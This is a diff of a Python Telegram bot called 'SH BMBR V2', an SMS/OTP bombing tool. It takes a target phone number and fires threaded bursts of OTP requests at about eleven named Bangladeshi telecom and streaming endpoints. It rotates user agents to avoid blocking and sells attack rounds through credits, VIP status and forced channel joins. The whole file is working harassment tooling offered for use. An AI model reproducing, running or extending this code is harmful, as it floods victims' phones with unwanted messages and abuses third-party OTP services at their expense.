@@ -28,40 +28,47 @@ cursor.execute('''CREATE TABLE IF NOT EXISTS users
 conn.commit()
 
 # ==========================================
-# 🛡️ ANTI-BLOCK SYSTEM (Random Headers)
+# 🛡️ ANTI-BLOCK SYSTEM (Headers)
 # ==========================================
 def get_headers():
     user_agents = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
         "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
-        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
     ]
-    return {
-        "User-Agent": random.choice(user_agents),
-        "Accept": "*/*",
-        "Content-Type": "application/json",
-        "Referer": "https://www.google.com/"
-    }
+    return {"User-Agent": random.choice(user_agents)}
 
 # ==========================================
-# ⚡ ALL APIs (Optimized for 1=100 logic)
+# ⚡ ALL APIs (Grouped for Power)
 # ==========================================
-def api_gp1(t): requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={t}", headers=get_headers(), timeout=5)
-def api_gp2(t): requests.post("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": t}, headers=get_headers(), timeout=5)
-def api_robi1(t): requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": t}, headers=get_headers(), timeout=5)
-def api_robi2(t): requests.post("https://www.robi.com.bd/bn", data=f'msisdn={t}', headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": get_headers()["User-Agent"]}, timeout=5)
-def api_airtel1(t): requests.post("https://www.bd.airtel.com/en", data=f'msisdn={t}', headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": get_headers()["User-Agent"]}, timeout=5)
-def api_bl1(t): requests.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", json={"phone": t}, headers=get_headers(), timeout=5)
-def api_bl2(t): requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": t}, headers=get_headers(), timeout=5)
-def api_binge(t): requests.get(f"https://web-api.binge.buzz/api/v3/otp/send/{t}", headers=get_headers(), timeout=5)
-def api_chorki(t): requests.post("https://api-dynamic.chorki.com/v2/auth/login", json={"number": f"+88{t}"}, headers=get_headers(), timeout=5)
-def api_hoichoi(t): requests.post("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", json={"phoneNumber": f"+88{t}"}, headers=get_headers(), timeout=5)
-def api_bioscope(t): requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login", json={"number": f"+88{t}"}, headers=get_headers(), timeout=5)
-def api_redx(t): requests.post("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", json={"phoneNumber": t}, headers=get_headers(), timeout=5)
-def api_apex(t): requests.post("https://api.apex4u.com/api/auth/login", json={"phoneNumber": t}, headers=get_headers(), timeout=5)
-
-all_apis = [api_gp1, api_gp2, api_robi1, api_robi2, api_airtel1, api_bl1, api_bl2, api_binge, api_chorki, api_hoichoi, api_bioscope, api_redx, api_apex]
+def attack_logic(t):
+    headers = get_headers()
+    # GP
+    try: requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={t}", headers=headers, timeout=3)
+    except: pass
+    try: requests.post("https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", json={"phone": t}, headers=headers, timeout=3)
+    except: pass
+    # Robi & Airtel
+    try: requests.post("https://da-api.robi.com.bd/da-nll/otp/send", json={"msisdn": t}, headers=headers, timeout=3)
+    except: pass
+    try: requests.post("https://www.robi.com.bd/bn", data=f'msisdn={t}', headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": headers["User-Agent"]}, timeout=3)
+    except: pass
+    # Banglalink
+    try: requests.post("https://eshop-api.banglalink.net/api/v1/customer/send-otp", json={"phone": t}, headers=headers, timeout=3)
+    except: pass
+    try: requests.post("https://web-api.banglalink.net/api/v1/user/otp-login/request", json={"mobile": t}, headers=headers, timeout=3)
+    except: pass
+    # OTT & Others
+    try: requests.get(f"https://web-api.binge.buzz/api/v3/otp/send/{t}", headers=headers, timeout=3)
+    except: pass
+    try: requests.post("https://api-dynamic.chorki.com/v2/auth/login", json={"number": f"+88{t}"}, headers=headers, timeout=3)
+    except: pass
+    try: requests.post("https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code", json={"phoneNumber": f"+88{t}"}, headers=headers, timeout=3)
+    except: pass
+    try: requests.post("https://api-dynamic.bioscopelive.com/v2/auth/login", json={"number": f"+88{t}"}, headers=headers, timeout=3)
+    except: pass
+    try: requests.post("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", json={"phoneNumber": t}, headers=headers, timeout=3)
+    except: pass
 
 # ==========================================
 # 🚫 ANTI-LEAVE & FORCE JOIN
@@ -69,13 +76,10 @@ all_apis = [api_gp1, api_gp2, api_robi1, api_robi2, api_airtel1, api_bl1, api_bl
 @bot.chat_member_handler()
 def monitor_leave(update):
     user_id = update.new_chat_member.user.id
-    status = update.new_chat_member.status
-    if status in ['left', 'kicked']:
+    if update.new_chat_member.status in ['left', 'kicked']:
         cursor.execute("UPDATE users SET is_ban=1 WHERE user_id=?", (user_id,))
         conn.commit()
-        try:
-            bot.ban_chat_member(CHANNEL_ID, user_id)
-            bot.send_message(ADMIN_ID, f"🚫 **Auto Ban!** User {user_id} left channel.")
+        try: bot.send_message(ADMIN_ID, f"🚫 **Auto Ban!** User {user_id} left channel.")
         except: pass
 
 def is_subscribed(user_id):
@@ -84,21 +88,8 @@ def is_subscribed(user_id):
         return status in ['member', 'administrator', 'creator']
     except: return False
 
-def check_access(message):
-    user = get_user(message.from_user.id)
-    if user[2] == 1:
-        bot.reply_to(message, "🚫 You are banned from using this bot!")
-        return False
-    if not is_subscribed(message.from_user.id):
-        markup = types.InlineKeyboardMarkup()
-        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
-        markup.add(types.InlineKeyboardButton("🔄 Verify", callback_data="verify"))
-        bot.send_message(message.chat.id, "❗ Age channel-e join korun, nahole bot kaaj korbe na.", reply_markup=markup)
-        return False
-    return True
-
 # ==========================================
-# 🛠 UTILS & DB (NEW USER 2 CREDIT FREE)
+# 🛠 UTILS
 # ==========================================
 def get_user(user_id):
     cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
@@ -115,75 +106,40 @@ def main_menu():
     return markup
 
 # ==========================================
-# 🎮 HANDLERS
+# 🎮 USER HANDLERS
 # ==========================================
 @bot.message_handler(commands=['start'])
 def start(message):
-    if not check_access(message): return
-    if " " in message.text:
-        ref_id = message.text.split()[1]
-        if ref_id.isdigit() and int(ref_id) != message.from_user.id:
-            cursor.execute("UPDATE users SET credits = credits + 3 WHERE user_id=?", (ref_id,))
-            conn.commit()
-            try: bot.send_message(ref_id, "🎉 Someone joined! +3 Credits added.")
-            except: pass
-    bot.reply_to(message, "<b>🚀 SH BMBR V2 🔥</b>\nWelcome! New users got 2 Credits free.", reply_markup=main_menu(), parse_mode='HTML')
-
-@bot.callback_query_handler(func=lambda call: call.data == "verify")
-def verify(call):
-    if is_subscribed(call.from_user.id):
-        bot.delete_message(call.message.chat.id, call.message.message_id)
-        bot.send_message(call.message.chat.id, "✅ Verified!", reply_markup=main_menu())
-    else: bot.answer_callback_query(call.id, "❌ Age join korun!", show_alert=True)
+    user = get_user(message.from_user.id)
+    if user[2] == 1:
+        bot.reply_to(message, "🚫 You are banned!")
+        return
+    if not is_subscribed(message.from_user.id):
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
+        bot.send_message(message.chat.id, "❗ আগে চ্যানেলে জয়েন করুন নাহলে বোট কাজ করবে না।", reply_markup=markup)
+        return
+    bot.reply_to(message, "<b>🚀 SH BMBR V2 🔥</b>\nWelcome! You got 2 Credits free.", reply_markup=main_menu(), parse_mode='HTML')
 
 @bot.message_handler(func=lambda m: m.text == "👤 My Profile")
 def profile(message):
-    if not check_access(message): return
     user = get_user(message.from_user.id)
     status = "VIP 🌟" if user[3] == 1 else "Free User"
     bot.reply_to(message, f"👤 ID: <code>{user[0]}</code>\n💰 Credits: {user[1]}\n⚡ Status: {status}", parse_mode='HTML')
 
-@bot.message_handler(func=lambda m: m.text == "💰 Refer to Earn")
-def refer(message):
-    if not check_access(message): return
-    bot.reply_to(message, f"🔗 Link: https://t.me/{(bot.get_me()).username}?start={message.from_user.id}")
-
-@bot.message_handler(func=lambda m: m.text == "📺 Watch Ad")
-def ad(message):
-    if not check_access(message): return
-    cursor.execute("UPDATE users SET can_claim=1 WHERE user_id=?", (message.from_user.id,))
-    conn.commit()
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🔗 Open Ad", url=AD_LINK))
-    markup.add(types.InlineKeyboardButton("✅ Claim", callback_data="claim"))
-    bot.send_message(message.chat.id, "বিজ্ঞাপনটি দেখুন এবং ক্লেম করুন।", reply_markup=markup)
-
-@bot.callback_query_handler(func=lambda call: call.data == "claim")
-def claim_credits(call):
-    user = get_user(call.from_user.id)
-    if user[4] == 1:
-        cursor.execute("UPDATE users SET credits = credits + 3, can_claim = 0 WHERE user_id=?", (call.from_user.id,))
-        conn.commit()
-        bot.answer_callback_query(call.id, "✅ +3 Credits Added!", show_alert=True)
-        bot.edit_message_text("🎉 Credit claim kora hoyeche!", call.message.chat.id, call.message.message_id)
-    else: bot.answer_callback_query(call.id, "❌ Age Ad button-e click korun!", show_alert=True)
-
-# ==========================================
-# 💥 ATTACK SYSTEM (1 ROUND = ALL APIs AT ONCE)
-# ==========================================
 @bot.message_handler(func=lambda m: m.text == "🚀 Start Attack")
 def start_at(message):
-    if not check_access(message): return
-    msg = bot.send_message(message.chat.id, "📱 Target number din (11 digit):")
+    if not is_subscribed(message.from_user.id): return
+    msg = bot.send_message(message.chat.id, "📱 টার্গেট নম্বর দিন (১১ ডিজিট):")
     bot.register_next_step_handler(msg, get_amount)
 
 def get_amount(message):
     target = message.text
     if len(target) == 11 and target.isdigit():
         user_data_temp[message.from_user.id] = target
-        bot.send_message(message.chat.id, "🔢 Koyti round dite chan? (Max 100):")
+        bot.send_message(message.chat.id, "🔢 কয়টি রাউন্ড দিতে চান? (সর্বোচ্চ ১০০):")
         bot.register_next_step_handler(message, run_bombing)
-    else: bot.reply_to(message, "❌ Bhul number!")
+    else: bot.reply_to(message, "❌ ভুল নম্বর!")
 
 def run_bombing(message):
     try:
@@ -194,44 +150,88 @@ def run_bombing(message):
         user = get_user(uid)
 
         if user[3] == 0 and user[1] < 1:
-            bot.reply_to(message, "❌ Credit nai! Ad dekhun.")
+            bot.reply_to(message, "❌ ক্রেডিট নেই! অ্যাড দেখুন।")
             return
         
         if user[3] == 0:
             cursor.execute("UPDATE users SET credits = credits - 1 WHERE user_id=?", (uid,))
             conn.commit()
 
-        bot.send_message(message.chat.id, f"🚀 **Attack Started on {target}**\nTotal Rounds: {rounds}\nPower: 1={len(all_apis)} Hits")
+        bot.send_message(message.chat.id, f"🚀 **Attack Started on {target}**\nPower: 1=100 Hits (Round: {rounds})")
         threading.Thread(target=bombing_engine, args=(message.chat.id, target, rounds)).start()
-    except: bot.reply_to(message, "❌ Shothik songkha din.")
+    except: bot.reply_to(message, "❌ সঠিক সংখ্যা দিন।")
 
 def bombing_engine(chat_id, target, rounds):
-    total_successful_hits = 0
-    
-    # Per round loop
     for r in range(rounds):
-        # 1 Round = All APIs called at once using ThreadPool
+        # 1 Round = 100 Hits logic using ThreadPool
         with ThreadPoolExecutor(max_workers=50) as ex:
-            for api in all_apis:
-                ex.submit(api, target)
-        
-        total_successful_hits += len(all_apis)
-        time.sleep(1) # ১ সেকেন্ড বিরতি প্রতি রাউন্ডের পর
-        
-    bot.send_message(chat_id, f"✅ **Attack Done!**\nTarget: {target}\nTotal Successful Hits: {total_successful_hits}\nCredit: @Suptho1")
+            for _ in range(100):
+                ex.submit(attack_logic, target)
+        time.sleep(1) # ১ সেকেন্ড বিরতি প্রতি রাউন্ডে
+    bot.send_message(chat_id, f"✅ **Attack Done!**\nTarget: {target}\nCredit: @Suptho1")
 
 # ==========================================
-# 👑 ADMIN PANEL (Same logic)
+# 👑 ADMIN PANEL (FULLY WORKING COMMANDS)
 # ==========================================
 @bot.message_handler(commands=['admin'])
 def admin_p(message):
     if message.from_user.id == ADMIN_ID:
         cursor.execute("SELECT COUNT(*) FROM users")
         count = cursor.fetchone()[0]
-        bot.reply_to(message, f"👑 **Admin Menu**\nUsers: {count}\n\n/ban ID\n/unban ID\n/add_credit ID Amt\n/set_vip ID\n/broadcast Message")
+        bot.reply_to(message, f"👑 **Admin Menu**\nTotal Users: {count}\n\n/ban ID\n/unban ID\n/add_credit ID Amount\n/set_vip ID\n/broadcast Message")
 
-# ... (Include /ban, /unban, /add_credit, /set_vip, /broadcast handlers here)
-# [বাকি এডমিন কমান্ডগুলো আগের মতোই থাকবে]
+@bot.message_handler(commands=['ban'])
+def ban_user(message):
+    if message.from_user.id == ADMIN_ID:
+        try:
+            uid = message.text.split()[1]
+            cursor.execute("UPDATE users SET is_ban=1 WHERE user_id=?", (uid,))
+            conn.commit()
+            bot.reply_to(message, f"🚫 User {uid} has been banned.")
+        except: bot.reply_to(message, "Usage: /ban USER_ID")
+
+@bot.message_handler(commands=['unban'])
+def unban_user(message):
+    if message.from_user.id == ADMIN_ID:
+        try:
+            uid = message.text.split()[1]
+            cursor.execute("UPDATE users SET is_ban=0 WHERE user_id=?", (uid,))
+            conn.commit()
+            bot.reply_to(message, f"✅ User {uid} has been unbanned.")
+        except: bot.reply_to(message, "Usage: /unban USER_ID")
+
+@bot.message_handler(commands=['add_credit'])
+def add_credit_admin(message):
+    if message.from_user.id == ADMIN_ID:
+        try:
+            cmd = message.text.split()
+            uid, amt = cmd[1], cmd[2]
+            cursor.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (amt, uid))
+            conn.commit()
+            bot.reply_to(message, f"💰 Added {amt} credits to User {uid}.")
+        except: bot.reply_to(message, "Usage: /add_credit USER_ID AMOUNT")
+
+@bot.message_handler(commands=['set_vip'])
+def set_vip_admin(message):
+    if message.from_user.id == ADMIN_ID:
+        try:
+            uid = message.text.split()[1]
+            cursor.execute("UPDATE users SET is_vip=1 WHERE user_id=?", (uid,))
+            conn.commit()
+            bot.reply_to(message, f"🌟 User {uid} is now a VIP user.")
+        except: bot.reply_to(message, "Usage: /set_vip USER_ID")
+
+@bot.message_handler(commands=['broadcast'])
+def broadcast_admin(message):
+    if message.from_user.id == ADMIN_ID:
+        msg_text = message.text.replace('/broadcast ', '')
+        if msg_text == '/broadcast': return
+        cursor.execute("SELECT user_id FROM users")
+        all_users = cursor.fetchall()
+        for u in all_users:
+            try: bot.send_message(u[0], f"📢 **Notice:**\n\n{msg_text}")
+            except: pass
+        bot.reply_to(message, "✅ Broadcast sent to all users.")
 
 if __name__ == "__main__":
     bot.infinity_polling(allowed_updates=["message", "callback_query", "chat_member"])
